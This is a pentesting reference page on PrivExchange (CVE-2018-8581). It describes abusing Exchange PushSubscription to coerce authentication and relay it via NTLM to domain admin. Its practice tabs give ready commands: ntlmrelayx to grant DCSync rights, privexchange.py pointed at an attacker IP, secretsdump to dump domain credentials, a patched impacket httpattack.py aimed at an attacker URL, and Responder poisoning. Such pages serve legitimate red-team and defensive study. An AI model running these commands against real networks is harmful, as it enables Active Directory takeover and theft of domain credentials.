---
description: CVE-2018-8581
---

# PrivExchange

## Theory

PrivExchange relay on the [PushSubscription coerced authentication](../mitm-and-coerced-authentications/pushsubscription-abuse.md), PushSubscription is an API on Exchange Web Services that allows to subscribe to push notifications. Attackers abuse it to make Exchange servers authenticate to a target of their choosing. **The coerced authentication is made over HTTP**, which is particularly powerful when doing [NTLM relay](../ntlm/relay.md) ([because of the Session Signing and MIC mitigations](../ntlm/relay.md#mic-message-integrity-code)).&#x20;

As Exchange servers usually have high privileges in a domain (i.e. `WriteDacl`, see [Abusing ACLs](../dacl/)), the forced authentication can then be relayed and abused to obtain domain admin privileges (see [NTLM Relay](../ntlm/relay.md) and [Kerberos Unconstrained Delegations](../kerberos/delegations/#unconstrained-delegations-kud)).

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

## Practice

{% hint style="warning" %}
On February 12th 2019, Microsoft released updates for Exchange which resolved

* the coerced authentication issue
* the fact that Exchange servers had overkill permissions leading attacker to a full domain compromission.
{% endhint %}

{% tabs %}
{% tab title="Exploit - with creds" %}
First, start the NTLM relay that will escalate privileges

```bash
# NTLM relaying is used to relay connexion and give DCSync privileges
ntlmrelayx.py -t ldap://$DC --escalate-user $USER_TO_ESCALATE
```

Using [PrivExchange](https://github.com/dirkjanm/privexchange/), we can log in on Exchange Web Services and call the API. The user must have a mailbox to make the coerced authentication.

```bash
privexchange.py -d $DOMAIN -u '$DOMAIN_USER' -p '$PASSWORD' -ah $ATTACKER_IP $EXCHANGE_SERVER_TARGET
```

We can now dump domain credentials throught DCSync

```bash
secretsdump.py $DOMAIN/$USER_TO_ESCALATE@$DC -just-dc
```
{% endtab %}

{% tab title="Exploit - without creds" %}
If you don't have any credentials, it is still possible to [relay the authentication](../ntlm/relay.md) to make the API call. The [httpattack.py](https://github.com/dirkjanm/PrivExchange/blob/master/httpattack.py) script can be used with ntlmrelayx.py to perform this attack. It uses NTLM Relaying with LLMNR / NBT-NS to relay captured credentials over the network.

Using the modified httpattack.py, we can use ntlmrelayx to perform this attack.

```bash
#Backup the old httpattack.py
cd /PATH/TO/impacket/impacket/examples/ntlmrelayx/attacks/
mv httpattack.py httpattack.py.old

#Replace it
wget https://raw.githubusercontent.com/dirkjanm/PrivExchange/master/httpattack.py
#Edit the attacker_url parameter (the host to which Exchange will authenticate)
sed -i 's/attacker_url = .*$/attacker_url = "$ATTACKER_URL"/' httpattack.py

#Build the env
cd /PATH/TO/impacket
virtualenv venv && source venv/bin/activate
pip install .

#Start relay
ntlmrelayx.py -t https://exchange.server.EWS/Exchange.asmx
```

We can now use LLMNR/NBT-NS/mDNS poisoning with responder, to capture credentials and relay them:

```bash
responder -i eth0
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/" %}
